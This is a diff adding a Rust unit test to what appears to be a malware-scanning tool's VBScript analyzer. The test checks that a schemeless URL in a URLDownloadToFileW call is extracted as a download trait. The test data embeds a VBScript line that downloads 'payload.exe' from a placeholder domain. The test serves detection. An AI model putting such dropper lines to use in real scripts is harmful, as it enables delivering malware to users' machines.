@@ -13756,6 +13756,28 @@ URLDownloadToFileA 0, u, "ansi.exe", 0, 0"#;
     }
 
     #[test]
+    fn vbs_urldownloadtofile_schemeless_domain_path_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let vbs = br#"Dim u
+u = "vbs-urldown-schemeless.com/payload.exe"
+URLDownloadToFileW 0, u, "wide.exe", 0, 0"#;
+        env.all_extracted_vbs.push(vbs.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "http://vbs-urldown-schemeless.com/payload.exe"
+                        && dst.as_deref() == Some("wide.exe")
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from schemeless VBS URLDownloadToFileW: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn vbs_urldownloadtofile_url_extracted_from_inline_concat_argument() {
         let mut env = Environment::new(&Config::default());
         let vbs =
